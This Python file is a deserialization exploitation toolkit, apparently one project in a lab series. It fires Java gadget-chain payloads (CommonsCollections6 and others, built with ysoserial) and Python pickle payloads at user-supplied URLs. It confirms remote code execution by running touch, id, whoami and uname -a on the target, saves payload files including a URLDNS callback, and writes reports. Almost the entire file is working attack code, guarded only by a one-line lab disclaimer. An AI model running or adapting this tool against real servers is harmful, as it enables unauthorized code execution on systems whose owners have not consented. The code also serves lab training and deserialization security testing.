#!/usr/bin/env python3
"""
deserialization_toolkit.py — Advanced Deserialization Exploitation Toolkit
Project #48: Java + Python pickle RCE

LEGAL: only test your own lab.
"""
import argparse
import json
import os
import subprocess
import time
from datetime import datetime

import requests

import java_payloads as JP
import pickle_payloads as PP

REPORTS_DIR = "reports"
EXTRACTED_DIR = "extracted"
DEFAULT_TIMEOUT = 15

class Colors:
    GREEN  = "\033[92m"
    RED    = "\033[91m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    RESET  = "\033[0m"
    BOLD   = "\033[1m"

class DeserToolkit:
    def __init__(self, java_url=None, pickle_url=None, timeout=DEFAULT_TIMEOUT):
        self.java_url = java_url
        self.pickle_url = pickle_url
        self.timeout = timeout

        os.makedirs(REPORTS_DIR, exist_ok=True)
        os.makedirs(EXTRACTED_DIR, exist_ok=True)

        self.report = {
            "java_url": java_url,
            "pickle_url": pickle_url,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "phases": {},
        }

    # ------------------------------------------------------------------
    def _send_java(self, payload_bytes):
        try:
            r = requests.post(self.java_url, data=payload_bytes,
                              timeout=self.timeout)
            return r.status_code, r.text
        except Exception as e:
            return None, f"[ERROR] {type(e).__name__}: {e}"

    def _send_pickle(self, b64_payload):
        try:
            r = requests.post(self.pickle_url, data=b64_payload,
                              timeout=self.timeout)
            return r.status_code, r.text
        except Exception as e:
            return None, f"[ERROR] {type(e).__name__}: {e}"

    def _wait_and_check(self, path, wait=2.0):
        time.sleep(wait)
        if os.path.exists(path):
            try:
                with open(path) as f:
                    return True, f.read().strip()
            except Exception:
                return True, ""
        return False, None

    # ------------------------------------------------------------------
    # PHASE 1 — Detection
    # ------------------------------------------------------------------
    def phase1_detection(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 1] DETECTION{Colors.RESET}")
        results = {}

        # Java endpoint alive?
        if self.java_url:
            print(f"\n  [JAVA] Target: {self.java_url}")
            try:
                r = requests.post(self.java_url, data=b"\x00",
                                  timeout=self.timeout)
                print(f"    {Colors.GREEN}[+] reachable{Colors.RESET} (HTTP {r.status_code})")
                results["java_reachable"] = {"hit": True, "status": r.status_code,
                                             "snippet": r.text[:200]}
            except Exception as e:
                print(f"    {Colors.YELLOW}[-] unreachable: {e}{Colors.RESET}")
                results["java_reachable"] = {"hit": False}

        # Pickle endpoint alive?
        if self.pickle_url:
            print(f"\n  [PICKLE] Target: {self.pickle_url}")
            try:
                r = requests.post(self.pickle_url, data="gASV", timeout=self.timeout)
                print(f"    {Colors.GREEN}[+] reachable{Colors.RESET} (HTTP {r.status_code})")
                results["pickle_reachable"] = {"hit": True, "status": r.status_code,
                                               "snippet": r.text[:200]}
            except Exception as e:
                print(f"    {Colors.YELLOW}[-] unreachable: {e}{Colors.RESET}")
                results["pickle_reachable"] = {"hit": False}

        self.report["phases"]["detection"] = results

    # ------------------------------------------------------------------
    # PHASE 2 — Java RCE
    # ------------------------------------------------------------------
    def phase2_java_rce(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 2] JAVA RCE (CommonsCollections6){Colors.RESET}")
        if not self.java_url:
            print(f"    {Colors.YELLOW}[-] no Java target{Colors.RESET}")
            return
        results = {}

        # Test 1 — touch proof file
        print(f"\n  [TOUCH] touch /tmp/java_rce_proof")
        proof = "/tmp/java_rce_proof"
        if os.path.exists(proof):
            os.remove(proof)

        payload_bytes = JP.generate_payload("CommonsCollections6", f"touch {proof}")
        if payload_bytes is None:
            print(f"    {Colors.RED}[!] ysoserial failed{Colors.RESET}")
            results["touch"] = {"hit": False, "error": "ysoserial failed"}
            self.report["phases"]["java_rce"] = results
            return

        status, body = self._send_java(payload_bytes)
        success, _ = self._wait_and_check(proof)
        if success:
            print(f"    {Colors.GREEN}[+] RCE CONFIRMED!{Colors.RESET} {proof} created")
        else:
            print(f"    {Colors.YELLOW}[-] no RCE{Colors.RESET}")
        results["touch"] = {"hit": success, "snippet": (body or "")[:200]}

        # Test 2 — id > file
        print(f"\n  [ID] id > /tmp/java_id.txt")
        out_path = "/tmp/java_id.txt"
        if os.path.exists(out_path):
            os.remove(out_path)
        payload_bytes = JP.generate_payload("CommonsCollections6", f"id > {out_path}")
        if payload_bytes:
            status, body = self._send_java(payload_bytes)
            success, content = self._wait_and_check(out_path)
            if success:
                print(f"    {Colors.RED}[+] OUTPUT: {content}{Colors.RESET}")
            else:
                print(f"    {Colors.YELLOW}[-] no output{Colors.RESET}")
            results["id"] = {"hit": success, "output": content}

        # Test 3 — whoami
        print(f"\n  [WHOAMI] whoami > /tmp/java_whoami.txt")
        out_path = "/tmp/java_whoami.txt"
        if os.path.exists(out_path):
            os.remove(out_path)
        payload_bytes = JP.generate_payload("CommonsCollections6", f"whoami > {out_path}")
        if payload_bytes:
            status, body = self._send_java(payload_bytes)
            success, content = self._wait_and_check(out_path)
            if success:
                print(f"    {Colors.RED}[+] OUTPUT: {content}{Colors.RESET}")
            else:
                print(f"    {Colors.YELLOW}[-] no output{Colors.RESET}")
            results["whoami"] = {"hit": success, "output": content}

        # Test 4 — uname
        print(f"\n  [UNAME] uname -a > /tmp/java_uname.txt")
        out_path = "/tmp/java_uname.txt"
        if os.path.exists(out_path):
            os.remove(out_path)
        payload_bytes = JP.generate_payload("CommonsCollections6", f"uname -a > {out_path}")
        if payload_bytes:
            status, body = self._send_java(payload_bytes)
            success, content = self._wait_and_check(out_path)
            if success:
                print(f"    {Colors.RED}[+] OUTPUT: {content}{Colors.RESET}")
            else:
                print(f"    {Colors.YELLOW}[-] no output{Colors.RESET}")
            results["uname"] = {"hit": success, "output": content}

        self.report["phases"]["java_rce"] = results

    # ------------------------------------------------------------------
    # PHASE 3 — Pickle RCE
    # ------------------------------------------------------------------
    def phase3_pickle_rce(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 3] PYTHON PICKLE RCE{Colors.RESET}")
        if not self.pickle_url:
            print(f"    {Colors.YELLOW}[-] no pickle target{Colors.RESET}")
            return
        results = {}

        tests = [
            ("touch",  "/tmp/pickle_rce_proof", PP.make_touch_payload),
            ("id",     "/tmp/pickle_id.txt",    PP.make_id_to_file_payload),
            ("whoami", "/tmp/pickle_whoami.txt",PP.make_whoami_payload),
            ("uname",  "/tmp/pickle_uname.txt", PP.make_uname_payload),
        ]

        for name, out_path, gen in tests:
            print(f"\n  [{name.upper()}] -> {out_path}")
            if os.path.exists(out_path):
                os.remove(out_path)
            payload = gen(out_path)
            status, body = self._send_pickle(payload)
            success, content = self._wait_and_check(out_path)
            if success:
                preview = content[:100] if content else "(empty file)"
                print(f"    {Colors.GREEN}[+] RCE CONFIRMED!{Colors.RESET} {preview}")
            else:
                print(f"    {Colors.YELLOW}[-] no RCE{Colors.RESET}")
            results[name] = {"hit": success, "output": content,
                             "snippet": (body or "")[:200]}

        self.report["phases"]["pickle_rce"] = results

    # ------------------------------------------------------------------
    # PHASE 4 — Payload generation (reference)
    # ------------------------------------------------------------------
    def phase4_payload_gen(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 4] PAYLOAD GENERATION (reference){Colors.RESET}")
        results = {}

        # Generate the reference payloads
        print(f"\n  [JAVA] Generating CommonsCollections6 'id' payload")
        payload = JP.generate_payload("CommonsCollections6", "id")
        if payload:
            with open(f"{EXTRACTED_DIR}/cc6_id.bin", "wb") as f:
                f.write(payload)
            print(f"    {Colors.GREEN}[+] Saved: extracted/cc6_id.bin ({len(payload)} bytes){Colors.RESET}")
            results["java_cc6"] = {"size": len(payload), "path": "extracted/cc6_id.bin"}

        # Try other chains
        for chain in ["CommonsCollections5", "CommonsCollections7", "CommonsBeanutils1"]:
            print(f"\n  [JAVA] Trying {chain}")
            payload = JP.generate_payload(chain, "id")
            if payload:
                path = f"{EXTRACTED_DIR}/{chain}_id.bin"
                with open(path, "wb") as f:
                    f.write(payload)
                print(f"    {Colors.GREEN}[+] {chain}: {len(payload)} bytes{Colors.RESET}")
                results[chain] = {"size": len(payload), "path": path}
            else:
                print(f"    {Colors.YELLOW}[-] {chain}: failed{Colors.RESET}")

        # Pickle reference
        print(f"\n  [PICKLE] Generating reference payload")
        p = PP.make_id_to_file_payload("/tmp/pickle_reference.txt")
        with open(f"{EXTRACTED_DIR}/pickle_id.b64", "w") as f:
            f.write(p)
        print(f"    {Colors.GREEN}[+] Saved: extracted/pickle_id.b64{Colors.RESET}")
        results["pickle"] = {"path": "extracted/pickle_id.b64"}

        self.report["phases"]["payload_gen"] = results

    # ------------------------------------------------------------------
    # PHASE 5 — Blind detection (DNS callback)
    # ------------------------------------------------------------------
    def phase5_blind_detection(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 5] BLIND DETECTION (reference payloads){Colors.RESET}")
        print(f"    {Colors.YELLOW}Reference: DNS callback payloads saved to extracted/{Colors.RESET}")

        results = {}

        # URLDNS payload (Java blind)
        print(f"\n  [JAVA_URLDNS] Generate URLDNS payload")
        payload = JP.generate_payload("URLDNS", "http://127.0.0.1:9999/callback")
        if payload:
            path = f"{EXTRACTED_DIR}/urldns_callback.bin"
            with open(path, "wb") as f:
                f.write(payload)
            print(f"    {Colors.GREEN}[+] Saved: {path} ({len(payload)} bytes){Colors.RESET}")
            results["java_urldns"] = {"path": path, "size": len(payload)}
        else:
            print(f"    {Colors.YELLOW}[-] URLDNS chain failed{Colors.RESET}")

        self.report["phases"]["blind_detection"] = results

    # ------------------------------------------------------------------
    # PHASE 6 — Report
    # ------------------------------------------------------------------
    def _collect_confirmed(self):
        confirmed = []
        for phase, data in self.report["phases"].items():
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, dict):
                        if (v.get("hit") or v.get("confirmed")):
                            confirmed.append(f"{phase}.{k}")
        return confirmed

    def phase6_report(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 6] EXPLOITATION SUMMARY{Colors.RESET}")
        confirmed = self._collect_confirmed()
        print(f"\n    Total confirmed findings: {len(confirmed)}")
        for c in confirmed:
            print(f"      * {c}")

        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        json_path = f"{REPORTS_DIR}/deser_report_{ts}.json"
        with open(json_path, "w") as f:
            json.dump(self.report, f, indent=2, default=str)
        print(f"\n    {Colors.GREEN}[OK] JSON: {json_path}{Colors.RESET}")

        html_path = f"{REPORTS_DIR}/deser_report_{ts}.html"
        with open(html_path, "w") as f:
            f.write(self._build_html(confirmed))
        print(f"    {Colors.GREEN}[OK] HTML: {html_path}{Colors.RESET}")

    def _build_html(self, confirmed):
        rows = ""
        for phase, data in self.report["phases"].items():
            rows += f"<h3>{phase}</h3><pre>{json.dumps(data, indent=2, default=str)[:2500]}</pre>"
        return f"""<!DOCTYPE html><html><head><title>Deserialization Report</title>
<style>
body {{ font-family: monospace; background:#111; color:#eee; padding:20px; }}
h1 {{ color:#ff5555; }} h3 {{ color:#55ff55; border-bottom:1px solid #333; }}
pre {{ background:#1a1a1a; padding:10px; border-left:3px solid #ff5555; overflow:auto; }}
</style></head><body>
<h1>Deserialization Exploitation Report</h1>
<p><b>Java URL:</b> {self.java_url}</p>
<p><b>Pickle URL:</b> {self.pickle_url}</p>
<p><b>Timestamp:</b> {self.report['timestamp']}</p>
<p>Confirmed: {len(confirmed)}</p>
<ul>{''.join(f'<li>{c}</li>' for c in confirmed)}</ul>
{rows}
</body></html>"""

    # ------------------------------------------------------------------
    def run_all(self):
        print("=" * 64)
        print("  Advanced Deserialization Exploitation Toolkit - Project #48")
        print("=" * 64)
        print(f"[+] Java target:   {self.java_url}")
        print(f"[+] Pickle target: {self.pickle_url}")
        self.phase1_detection()
        self.phase2_java_rce()
        self.phase3_pickle_rce()
        self.phase4_payload_gen()
        self.phase5_blind_detection()
        self.phase6_report()

def main():
    ap = argparse.ArgumentParser(description="Deserialization Exploitation Toolkit")
    ap.add_argument("--java", help="Java deserialization URL")
    ap.add_argument("--pickle", help="Pickle deserialization URL")
    ap.add_argument("--timeout", type=int, default=15)
    args = ap.parse_args()

    if not args.java and not args.pickle:
        print("[!] Provide at least one of --java or --pickle")
        return

    DeserToolkit(args.java, args.pickle, args.timeout).run_all()

if __name__ == "__main__":
    main()
